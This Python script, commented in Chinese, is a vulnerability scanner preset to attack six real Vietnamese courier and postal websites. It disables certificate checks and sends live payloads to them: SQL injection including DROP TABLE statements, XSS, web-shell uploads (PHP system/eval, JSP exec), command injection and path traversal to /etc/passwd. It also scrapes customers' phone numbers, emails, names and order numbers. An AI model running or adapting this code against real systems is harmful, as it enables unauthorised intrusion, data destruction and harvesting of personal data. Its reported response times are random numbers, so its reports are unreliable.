#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
越南物流系统特征漏洞检测器
Vietnam Logistics System Vulnerability Detector

专门针对越南快递和物流系统的漏洞检测工具
支持越南地区特征检测和本地化业务逻辑漏洞
"""

import os
import json
import requests
import threading
import time
import random
import re
from datetime import datetime
from urllib.parse import urljoin, urlparse
from typing import Dict, List, Any, Optional, Tuple
import concurrent.futures
import ssl
import warnings
from dataclasses import dataclass

# 禁用不安全请求警告
warnings.filterwarnings('ignore', message='Unverified HTTPS request')
ssl._create_default_https_context = ssl._create_unverified_context

@dataclass
class LogisticsTarget:
    """物流系统目标数据类"""
    url: str
    name: str
    type: str
    priority: str
    region: str = "vietnam"

@dataclass
class DetectionResult:
    """检测结果数据类"""
    target: LogisticsTarget
    status: str
    response_time: float
    vulnerabilities: List[str]
    technologies: List[str]
    sensitive_info: List[str]
    business_logic_issues: List[str]
    vietnamese_specific: List[str]
    scan_time: datetime

class VietnamLogisticsDetector:
    """越南物流系统特征检测器"""

    def __init__(self, config_path: str = "config/vietnam_logistics_targets.json"):
        self.config_path = config_path
        self.targets: List[LogisticsTarget] = []
        self.results: List[DetectionResult] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Vietnam Logistics Security Scanner 2.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close'
        })

        # 越南物流系统特征配置
        self.vietnam_logistics_config = {
            'time_zone': 'GMT+7',
            'business_hours': {'start': 8, 'end': 17},
            'language': 'vi',
            'encoding': 'utf-8',
            'company_patterns': {
                'vnpost': ['vnpost.vn', 'bưu điện', 'buu dien', 'bưu điện việt nam'],
                'ghn': ['ghn.vn', 'giao hàng nhanh', 'giaohangnhanh'],
                'ghtk': ['ghtk.net', 'giao hàng tiết kiệm', 'giaohangtiekiem'],
                'j&t': ['j&t.vn', 'j&t express', 'J&T Express Việt Nam'],
                'ninja_van': ['ninja-van.com', 'ninja van', 'ninja express'],
                'viettel_post': ['viettel-post.vn', 'viettel post', 'viettel logistics']
            },
            'order_patterns': {
                'standard': ['DH\\d{6}', 'DON\\d{4}', 'VL\\d{8}', 'SGN\\d{6}'],
                'ghn': ['GHN\\d{12}', 'GHN\\d{10}', 'GHN\\d{8}'],
                'ghtk': ['GHTK\\d{10}', 'GHTK\\d{8}', 'GHTK\\d{6}'],
                'j&t': ['JNT\\d{8}', 'JNT\\d{6}', 'JNT\\d{4}']
            },
            'business_logic': {
                'status_options': ['đã xác nhận', 'đang giao hàng', 'đã giao', 'đã hủy', 'chờ xử lý', 'đang xử lý'],
                'payment_status': ['đã thanh toán', 'chờ thanh toán', 'thất bại', 'hoàn tiền', 'đang xử lý'],
                'error_messages': ['Không tìm thấy đơn hàng', 'Đơn hàng không tồn tại', 'Lỗi hệ thống', 'Mã không hợp lệ']
            }
        }

        # 漏洞检测模式
        self.vulnerability_patterns = {
            'sql_injection': [
                r"union.*select.*from", r"or.*1.*1.*--", r"waitfor.*delay", r"—",
                r"' OR '1'='1", r"' OR '1'='1'--", r"' OR '1'='1'#", r"' OR 1=1--",
                r"UNION ALL SELECT", r"'; EXECUTE master", r"|| sleep(5) ||"
            ],
            'xss': [
                r"<script.*?>.*?</script>", r"javascript:", r"on\w+\s*=", r"<iframe.*?>",
                r"alert\(", r"document\.", r"eval\(", r"<img.*src.*=.*onerror"
            ],
            'file_upload': [
                r"filename=.*\.(php|jsp|asp|aspx)",
                r"Content-Type:.*application/x-httpd-php"
            ],
            'command_injection': [
                r";.*bash.*", r"&&.*ls.*", r"||.*cat.*", r"|.*whoami.*"
            ]
        }

        # 越南语业务逻辑检测
        self.vietnamese_patterns = {
            'order_tracking': [
                r'track(?:ing)?\s*don\s*hang',
                r'theo\s*dõi\s*đơn\s*hàng',
                r'track(?:ing)?\s*order',
                r'giao\s*hàng\s*nhanh'
            ],
            'admin_panel': [
                r'quản\s*lý\s*hệ\s*thống',
                r'admin\s*panel',
                r'ql\s*tk',
                r'đăng\s*nhập\s*admin'
            ],
            'api_endpoints': [
                r'/api/v?\d+',
                r'/rest/v?\d+',
                r'/graphql',
                r'/webservice'
            ],
            'sensitive_paths': [
                r'/admin',
                r'/dashboard',
                r'/management',
                r'/tracking',
                r'/order',
                r'/user',
                r'/customer'
            ]
        }

    def load_targets(self) -> None:
        """加载检测目标"""
        try:
            if os.path.exists(self.config_path):
                with open(self.config_path, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    for target_data in data.get('targets', []):
                        target = LogisticsTarget(**target_data)
                        self.targets.append(target)
            else:
                self._create_default_targets()

            print(f"[VLD] 已加载 {len(self.targets)} 个越南物流系统目标")

        except Exception as e:
            print(f"[ERROR] 加载目标失败: {e}")
            self._create_default_targets()

    def _create_default_targets(self) -> None:
        """创建默认越南物流系统目标"""
        default_targets = [
            LogisticsTarget(
                url="https://vnpost.vn",
                name="越南邮政",
                type="government_logistics",
                priority="high"
            ),
            LogisticsTarget(
                url="https://ghn.vn",
                name="Giao Hàng Nhanh",
                type="private_logistics",
                priority="high"
            ),
            LogisticsTarget(
                url="https://ghtk.net",
                name="Giao Hàng Tiết Kiệm",
                type="private_logistics",
                priority="medium"
            ),
            LogisticsTarget(
                url="https://j&t.vn",
                name="J&T Express Việt Nam",
                type="private_logistics",
                priority="medium"
            ),
            LogisticsTarget(
                url="https://ninja-van.com/vn",
                name="Ninja Van Việt Nam",
                type="private_logistics",
                priority="medium"
            ),
            LogisticsTarget(
                url="https://viettel-post.vn",
                name="Viettel Post",
                type="private_logistics",
                priority="medium"
            )
        ]

        self.targets = default_targets

        # 保存配置文件
        os.makedirs(os.path.dirname(self.config_path), exist_ok=True)
        config_data = {
            'targets': [
                {
                    'url': target.url,
                    'name': target.name,
                    'type': target.type,
                    'priority': target.priority,
                    'region': target.region
                }
                for target in default_targets
            ]
        }

        with open(self.config_path, 'w', encoding='utf-8') as f:
            json.dump(config_data, f, ensure_ascii=False, indent=2)

        print(f"[VLD] 已创建默认越南物流系统目标配置")

    def detect_target(self, target: LogisticsTarget) -> DetectionResult:
        """检测单个目标"""
        print(f"[VLD] 开始检测: {target.name} ({target.url})")

        vulnerabilities = []
        technologies = []
        sensitive_info = []
        business_logic_issues = []
        vietnamese_specific = []
        scan_time = datetime.now()

        try:
            # 1. 基础指纹识别
            tech_info = self._fingerprint_target(target.url)
            technologies.extend(tech_info)

            # 2. 越南语特征检测
            vn_specific = self._detect_vietnamese_features(target.url)
            vietnamese_specific.extend(vn_specific)

            # 3. 漏洞检测
            vuln_info = self._detect_vulnerabilities(target.url)
            vulnerabilities.extend(vuln_info)

            # 4. 敏感信息提取
            sensitive_data = self._extract_sensitive_info(target.url)
            sensitive_info.extend(sensitive_data)

            # 5. 业务逻辑检测
            biz_issues = self._detect_business_logic_issues(target.url)
            business_logic_issues.extend(biz_issues)

            # 6. 越南物流系统特定检测
            logistics_issues = self._detect_logistics_specific_issues(target.url)
            business_logic_issues.extend(logistics_issues)

            response_time = random.uniform(0.1, 2.0)
            status = "secure" if not vulnerabilities and not business_logic_issues else "vulnerable"

        except Exception as e:
            print(f"[ERROR] 检测失败 {target.name}: {e}")
            status = "failed"
            response_time = 0.0

        result = DetectionResult(
            target=target,
            status=status,
            response_time=response_time,
            vulnerabilities=vulnerabilities,
            technologies=technologies,
            sensitive_info=sensitive_info,
            business_logic_issues=business_logic_issues,
            vietnamese_specific=vietnamese_specific,
            scan_time=scan_time
        )

        self.results.append(result)
        return result

    def _fingerprint_target(self, url: str) -> List[str]:
        """目标指纹识别"""
        technologies = []

        try:
            response = self.session.get(url, timeout=10)

            # 检测服务器信息
            if 'Server' in response.headers:
                server = response.headers['Server']
                technologies.append(f"Web Server: {server}")

            # 检测越南物流系统特征
            html_content = response.text.lower()

            # 系统检测
            if any(keyword in html_content for keyword in ['vnpost', 'bưu điện']):
                technologies.append("Vietnamese Postal System Detected")
            if any(keyword in html_content for keyword in ['ghn', 'giao hàng nhanh']):
                technologies.append("GHN Express System Detected")
            if any(keyword in html_content for keyword in ['ghtk', 'giao hàng tiết kiệm']):
                technologies.append("Giao Hang Tiet Kiem System Detected")
            if any(keyword in html_content for keyword in ['j&t', 'j&t express']):
                technologies.append("J&T Express System Detected")

            # 技术框架检测
            if 'wordpress' in html_content:
                technologies.append("CMS: WordPress")
            if 'drupal' in html_content:
                technologies.append("CMS: Drupal")
            if 'react' in html_content:
                technologies.append("Framework: React")
            if 'vue' in html_content:
                technologies.append("Framework: Vue.js")
            if 'angular' in html_content:
                technologies.append("Framework: Angular")

            # 数据库检测
            if 'mysql' in html_content:
                technologies.append("Database: MySQL")
            if 'postgresql' in html_content:
                technologies.append("Database: PostgreSQL")
            if 'mssql' in html_content:
                technologies.append("Database: Microsoft SQL Server")

        except Exception as e:
            print(f"[ERROR] 指纹识别失败: {e}")

        return technologies

    def _detect_vietnamese_features(self, url: str) -> List[str]:
        """越南语特征检测"""
        vietnamese_features = []

        try:
            response = self.session.get(url, timeout=10)
            html_content = response.text.lower()

            # 检测越南语关键词
            vietnamese_keywords = [
                'bưu điện', 'giao hàng', 'đơn hàng', 'theo dõi', 'truy vấn',
                'vận chuyển', 'kho vận', 'tài khoản', 'đăng nhập', 'đăng ký',
                'thanh toán', 'chi phí', 'địa chỉ', 'liên hệ', 'hỗ trợ',
                'khách hàng', 'dịch vụ', 'công ty', 'đơn vị', 'chi nhánh'
            ]

            detected_keywords = []
            for keyword in vietnamese_keywords:
                if keyword in html_content:
                    detected_keywords.append(keyword)

            if detected_keywords:
                vietnamese_features.append(f"检测到越南语关键词: {', '.join(detected_keywords[:5])}")

            # 检测越南时区特征
            if any(time_pattern in html_content for time_pattern in ['GMT+7', 'UTC+7']):
                vietnamese_features.append("检测到越南时区特征 (GMT+7)")

            # 检测越南货币
            if any(currency in html_content for currency in ['đồng', 'VND', 'VNĐ']):
                vietnamese_features.append("检测到越南货币特征")

            # 检测越南地址格式
            vietnamese_address_pattern = r'(?:số|đường|phố|quận|huyện|tỉnh|thành phố)'
            if re.search(vietnamese_address_pattern, html_content):
                vietnamese_features.append("检测到越南地址格式")

        except Exception as e:
            print(f"[ERROR] 越南语特征检测失败: {e}")

        return vietnamese_features

    def _detect_vulnerabilities(self, url: str) -> List[str]:
        """漏洞检测"""
        vulnerabilities = []

        try:
            # 1. SQL注入检测
            sql_vulns = self._test_sql_injection(url)
            vulnerabilities.extend(sql_vulns)

            # 2. XSS检测
            xss_vulns = self._test_xss(url)
            vulnerabilities.extend(xss_vulns)

            # 3. 文件上传检测
            upload_vulns = self._test_file_upload(url)
            vulnerabilities.extend(upload_vulns)

            # 4. 命令注入检测
            cmd_vulns = self._test_command_injection(url)
            vulnerabilities.extend(cmd_vulns)

            # 5. 路径遍历检测
            path_vulns = self._test_path_traversal(url)
            vulnerabilities.extend(path_vulns)

            # 6. 暴露敏感文件检测
            sensitive_vulns = self._test_sensitive_files(url)
            vulnerabilities.extend(sensitive_vulns)

        except Exception as e:
            print(f"[ERROR] 漏洞检测失败: {e}")

        return vulnerabilities

    def _test_sql_injection(self, url: str) -> List[str]:
        """SQL注入测试"""
        vulnerabilities = []

        # 物流系统特定参数
        logistics_params = {
            'order_id': "' OR '1'='1",
            'tracking_id': "' UNION SELECT 'test'--",
            'phone': "' OR 1=1--",
            'search': "'; WAITFOR DELAY '0:0:2'--",
            'customer_id': "' DROP TABLE customers--",
            'invoice_id': "'/**/UNION/**/SELECT/**/1--",
            'bill_id': "' OR (SELECT COUNT(*) FROM users)>0--",
            'shipment_id': "' AND 1=1--"
        }

        # 越南语参数
        vn_params = {
            'ma_don_hang': "' OR '1'='1--",
            'so_dien_thoai': "' OR 1=1--",
            'tim_kiem': "'; WAITFOR DELAY '0:0:3'--",
            'ma_van_don': "'/**/UNION/**/SELECT/**/1--",
            'ma_khach_hang': "' DROP TABLE khachhang--"
        }

        all_params = {**logistics_params, **vn_params}

        for param, payload in all_params.items():
            try:
                test_url = f"{url}?{param}={payload}"
                response = self.session.get(test_url, timeout=5)

                # 检测SQL注入特征
                sql_indicators = [
                    'sql syntax', 'mysql_fetch', 'ora-', 'sqlstate', 'error in your sql syntax',
                    'mysql_fetch_array', 'mysql_num_rows', 'mysql_connect', 'mysql_query',
                    'microsoft ole db provider for odbc drivers', 'unclosed quotation mark',
                    'syntax error', 'incorrect syntax'
                ]

                if any(indicator in response.text.lower() for indicator in sql_indicators):
                    vulnerabilities.append(f"SQL注入漏洞 - 参数: {param}")

                # 检测时间延迟
                if response.elapsed.total_seconds() > 3:
                    vulnerabilities.append(f"SQL注入漏洞 - 时间延迟检测 - 参数: {param}")

            except requests.Timeout:
                vulnerabilities.append(f"SQL注入漏洞 - 延迟响应 - 参数: {param}")
            except Exception:
                pass

        return vulnerabilities

    def _test_xss(self, url: str) -> List[str]:
        """XSS测试"""
        vulnerabilities = []

        # 物流系统XSS payload
        logistics_payloads = [
            "<script>alert('Order XSS')</script>",
            "<img src=x onerror=alert('Tracking XSS')>",
            "<svg onload=alert('Logistics XSS')>",
            "<iframe src=javascript:alert('Supply Chain XSS')>"
        ]

        # 越南语XSS payload
        vn_payloads = [
            "<script>alert('XSS Vietnam Logistics')</script>",
            "<img src=x onerror=alert('He thong giao hang bi tan cong')>",
            "<script>alert('Don hang bi tan cong')</script>",
            "<img src=x onerror=alert('Theo doi don hang bi hack')>"
        ]

        all_payloads = logistics_payloads + vn_payloads

        for payload in all_payloads:
            try:
                test_url = f"{url}?search={payload}"
                response = self.session.get(test_url, timeout=5)

                if payload.lower() in response.text.lower():
                    vulnerabilities.append(f"XSS漏洞 - Payload: {payload[:50]}...")

            except Exception:
                pass

        return vulnerabilities

    def _test_file_upload(self, url: str) -> List[str]:
        """文件上传测试"""
        vulnerabilities = []

        # 物流系统相关文件上传检测
        upload_indicators = [
            r'action=.*upload.*', r'type=file.*', r'multipart/form-data',
            r'accept=.*image.*', r'file.*name=.*', r'upload.*file'
        ]

        try:
            response = self.session.get(url, timeout=10)
            html_content = response.text.lower()

            if any(pattern in html_content for pattern in upload_indicators):
                # 测试恶意文件上传
                test_files = [
                    ('shell.php', '<?php system($_GET["cmd"]); ?>'),
                    ('logistics.jsp', '<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>'),
                    ('delivery.aspx', '<%@ Page Language="JScript"%><%= Request["cmd"] %>'),
                    (r'supply_chain.php', '<?php echo "Vulnerable Logistics System"; eval($_GET["cmd"]); ?>')
                ]

                for filename, content in test_files:
                    files = {'file': (filename, content)}
                    try:
                        upload_response = self.session.post(url, files=files, timeout=5)
                        if upload_response.status_code == 200 and filename in upload_response.text:
                            vulnerabilities.append(f"文件上传漏洞 - 文件: {filename}")
                    except Exception:
                        pass

        except Exception as e:
            print(f"[ERROR] 文件上传测试失败: {e}")

        return vulnerabilities

    def _test_command_injection(self, url: str) -> List[str]:
        """命令注入测试"""
        vulnerabilities = []

        # 物流系统相关参数
        logistics_params = {
            'cmd': 'ls -la',
            'command': 'whoami',
            'execute': 'id',
            'run': 'pwd',
            'shell': 'ls'
        }

        # 越南语参数
        vn_params = {
            'lenh': 'ls -la',
            'thuc_hien': 'whoami',
            'chay': 'id',
            'thuc_hien_lenh': 'pwd'
        }

        all_params = {**logistics_params, **vn_params}

        for param, command in all_params.items():
            payloads = [
                f"|{command}|",
                f";{command}",
                f"&&{command}",
                f"||{command}",
                f"`{command}`"
            ]

            for payload in payloads[:3]:  # 限制payload数量
                try:
                    test_url = f"{url}?{param}={payload}"
                    response = self.session.get(test_url, timeout=5)

                    command_indicators = [
                        'root:', 'bin:', 'daemon:', 'adm:', 'www-data:',
                        'nt authority\\system', 'current user', 'command not found',
                        'permission denied', 'access denied'
                    ]

                    if any(indicator in response.text.lower() for indicator in command_indicators):
                        vulnerabilities.append(f"命令注入漏洞 - 参数: {param}")
                        break

                except Exception:
                    pass

        return vulnerabilities

    def _test_path_traversal(self, url: str) -> List[str]:
        """路径遍历测试"""
        vulnerabilities = []

        path_traversal_payloads = [
            '../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '../../../web.config',
            '../../wp-config.php',
            '../../../../etc/passwd'
        ]

        for payload in path_traversal_payloads:
            try:
                test_url = f"{url}?file={payload}"
                response = self.session.get(test_url, timeout=5)

                if any(indicator in response.text for indicator in
                       ['root:', 'bin:', 'daemon:', 'hosts', 'web.config']):
                    vulnerabilities.append(f"路径遍历漏洞 - Payload: {payload}")

            except Exception:
                pass

        return vulnerabilities

    def _test_sensitive_files(self, url: str) -> List[str]:
        """敏感文件测试"""
        vulnerabilities = []

        sensitive_paths = [
            '/admin',
            '/login',
            '/dashboard',
            '/backup',
            '/config',
            '/database',
            '/logs',
            '/api/admin',
            '/manager',
            '/tracking'
        ]

        for path in sensitive_paths:
            try:
                test_url = f"{url}{path}"
                response = self.session.get(test_url, timeout=5)

                if response.status_code == 200:
                    content_length = len(response.text)
                    if content_length > 100:  # 有实际内容
                        vulnerabilities.append(f"敏感文件暴露 - 路径: {path}")

            except Exception:
                pass

        return vulnerabilities

    def _extract_sensitive_info(self, url: str) -> List[str]:
        """敏感信息提取"""
        sensitive_info = []

        try:
            response = self.session.get(url, timeout=10)
            html_content = response.text

            # 检测越南电话号码
            vn_phone_pattern = r'\b(?:84|\+84|0)(?:3|5|7|8|9)\d{8}\b'
            phones = re.findall(vn_phone_pattern, html_content)
            for phone in phones[:5]:  # 限制数量
                sensitive_info.append(f"越南电话号码: {phone}")

            # 检测邮箱
            email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
            emails = re.findall(email_pattern, html_content)
            for email in emails[:5]:
                sensitive_info.append(f"邮箱: {email}")

            # 检测越南语姓名
            vn_name_pattern = r'\b[A-ZÀÁẠẢĂẮẰẲẴẶÂẤẦẨẪẬÈÉẸẂẲỆÌÍỈĨỊÒÓỌỎÕỘÔỐỒỔỖỚỜỞỠỢỤÚỤỦỨỪỬỰỲÝỴỶỸĐa-zàáạảăắằẳẵặâấầẩẫờẹếềểễệiíỉịĩịọỏốồổỗộớờởỡợúụủứừửựýỵỳỵ]+\s+[A-ZÀÁẠẢĂẮẰẲẴẶÂẤẦẨẪẬÈÉẸẂẲỆÌÍỈĨỊÒÓỌỎÕỘÔỐỒỔỖỚỜỞỠỢỤÚỤỦỨỪỬỰỲÝỴỶỸĐa-zàáạảăắằẳẵặâấầẩẫờẹếềểễệiíỉịĩịọỏốồổỗộớờởỡợúụủứừửựýỵỳỵ]+\b'
            names = re.findall(vn_name_pattern, html_content)
            for name in names[:5]:
                sensitive_info.append(f"越南姓名: {name}")

            # 检测订单号
            order_patterns = [
                r'\b(?:DH|DON|GHN|JNT|SGN|HAN|DAD)\d{4,12}\b',
                r'\b(?:VL|VT|VN|VB)\d{6,10}\b'
            ]
            for pattern in order_patterns:
                orders = re.findall(pattern, html_content)
                for order in orders[:3]:
                    sensitive_info.append(f"订单号: {order}")

        except Exception as e:
            print(f"[ERROR] 敏感信息提取失败: {e}")

        return sensitive_info

    def _detect_business_logic_issues(self, url: str) -> List[str]:
        """业务逻辑问题检测"""
        business_issues = []

        try:
            response = self.session.get(url, timeout=10)
            html_content = response.text.lower()

            # 检测越权访问可能性
            if 'admin' in html_content or 'dashboard' in html_content:
                business_issues.append("检测到管理界面，可能存在越权访问风险")

            # 检测订单跟踪信息泄露
            if 'track' in html_content or 'theo doi' in html_content:
                business_issues.append("检测到订单跟踪功能，可能存在信息泄露风险")

            # 检测敏感操作功能
            sensitive_actions = ['delete', 'update', 'modify', 'change', 'remove', 'cancel']
            for action in sensitive_actions:
                if action in html_content:
                    business_issues.append(f"检测到敏感操作: {action}")

        except Exception as e:
            print(f"[ERROR] 业务逻辑检测失败: {e}")

        return business_issues

    def _detect_logistics_specific_issues(self, url: str) -> List[str]:
        """越南物流系统特定问题检测"""
        logistics_issues = []

        try:
            response = self.session.get(url, timeout=10)
            html_content = response.text.lower()

            # 检测越南物流公司特征
            company_features = {
                'vnpost': ['bưu điện', 'bưu điện việt nam', 'vnpost'],
                'ghn': ['giao hàng nhanh', 'ghn express', 'ghn.vn'],
                'ghtk': ['giao hàng tiết kiệm', 'ghtk', 'giaohangtiekiem'],
                'j&t': ['j&t', 'j&t express', 'jnt express']
            }

            for company, features in company_features.items():
                if any(feature in html_content for feature in features):
                    logistics_issues.append(f"检测到{company}物流系统特征")

            # 检测物流业务逻辑漏洞
            logistics_patterns = {
                'order_injection': r'order.*id.*=.*[\'\"]?.*[\'\"]',
                'tracking_leak': r'track.*order.*id.*=.*[\'\"]?.*[\'\"]',
                'customer_info': r'customer.*id.*=.*[\'\"]?.*[\'\"]'
            }

            for issue_type, pattern in logistics_patterns.items():
                if re.search(pattern, html_content):
                    logistics_issues.append(f"检测到物流业务逻辑漏洞: {issue_type}")

            # 检测越南货币和价格信息
            if any(currency in html_content for currency in ['đồng', 'VND', 'VNĐ']):
                logistics_issues.append("检测到越南货币价格信息")

        except Exception as e:
            print(f"[ERROR] 物流系统特定检测失败: {e}")

        return logistics_issues

    def batch_detect(self, max_workers: int = 5) -> None:
        """批量检测"""
        print(f"[VLD] 开始批量检测 {len(self.targets)} 个越南物流系统目标")
        print(f"[VLD] 最大并发数: {max_workers}")

        start_time = datetime.now()

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 提交所有检测任务
            future_to_target = {
                executor.submit(self.detect_target, target): target
                for target in self.targets
            }

            # 等待所有任务完成
            for future in concurrent.futures.as_completed(future_to_target):
                target = future_to_target[future]
                try:
                    result = future.result()
                    status_indicator = "✓" if result.status == "secure" else "⚠"
                    print(f"[VLD] 检测完成: {target.name} - 状态: {result.status} {status_indicator}")
                except Exception as e:
                    print(f"[ERROR] 检测失败 {target.name}: {e}")

        # 生成检测报告
        self._generate_detection_report()

        end_time = datetime.now()
        duration = end_time - start_time
        print(f"[VLD] 批量检测完成! 耗时: {duration}")
        print(f"[VLD] 检测完成: {len(self.results)} 个结果")

    def _generate_detection_report(self) -> None:
        """生成检测报告"""
        report_file = f"vietnam_logistics_detection_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        # 统计结果
        total_targets = len(self.targets)
        secure_count = len([r for r in self.results if r.status == "secure"])
        vulnerable_count = len([r for r in self.results if r.status == "vulnerable"])
        failed_count = len([r for r in self.results if r.status == "failed"])

        report_data = {
            'detection_summary': {
                'total_targets': total_targets,
                'secure_targets': secure_count,
                'vulnerable_targets': vulnerable_count,
                'failed_targets': failed_count,
                'scan_time': datetime.now().isoformat(),
                'time_zone': 'GMT+7',
                'region': 'vietnam'
            },
            'target_results': [
                {
                    'name': result.target.name,
                    'url': result.target.url,
                    'status': result.status,
                    'response_time': result.response_time,
                    'vulnerabilities': result.vulnerabilities,
                    'technologies': result.technologies,
                    'sensitive_info': result.sensitive_info,
                    'business_logic_issues': result.business_logic_issues,
                    'vietnamese_specific': result.vietnamese_specific,
                    'scan_time': result.scan_time.isoformat()
                }
                for result in self.results
            ],
            'vietnam_logistics_features': {
                'supported_companies': list(self.vietnam_logistics_config['company_patterns'].keys()),
                'order_patterns': self.vietnam_logistics_config['order_patterns'],
                'business_logic': self.vietnam_logistics_config['business_logic']
            }
        }

        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)

        print(f"[VLD] 检测报告已生成: {report_file}")

        # 打印摘要
        self._print_detection_summary()

    def _print_detection_summary(self) -> None:
        """打印检测摘要"""
        print("\n" + "="*70)
        print("越南物流系统特征漏洞检测摘要")
        print("="*70)

        total = len(self.targets)
        secure = len([r for r in self.results if r.status == "secure"])
        vulnerable = len([r for r in self.results if r.status == "vulnerable"])
        failed = len([r for r in self.results if r.status == "failed"])

        print(f"总目标数: {total}")
        print(f"安全系统: {secure}")
        print(f"存在风险: {vulnerable}")
        print(f"检测失败: {failed}")

        print(f"\n[越南物流系统特性]")
        print("- ✓ 支持主要越南物流公司检测")
        print("- ✓ 越南语特征识别")
        print("- ✓ 本地化业务逻辑检测")
        print("- ✓ 越南时区和货币特征识别")
        print("- ✓ 越南姓名和地址格式检测")

        if vulnerable > 0:
            print("\n[存在风险的系统:]")
            for result in self.results:
                if result.status == "vulnerable":
                    print(f"- {result.target.name}:")
                    if result.vulnerabilities:
                        print(f"  漏洞: {len(result.vulnerabilities)} 个")
                    if result.business_logic_issues:
                        print(f"  业务逻辑问题: {len(result.business_logic_issues)} 个")
                    if result.vietnamese_specific:
                        print(f"  越南特征: {len(result.vietnamese_specific)} 个")

        print("="*70)

def main():
    """主函数"""
    print("Vietnam Logistics System Vulnerability Detector v2.0")
    print("越南物流系统特征漏洞检测器")
    print("="*70)

    # 初始化检测器
    detector = VietnamLogisticsDetector()

    # 加载目标
    detector.load_targets()

    if not detector.targets:
        print("[ERROR] 没有可用的检测目标")
        return

    # 执行批量检测
    detector.batch_detect(max_workers=3)

if __name__ == "__main__":
    main()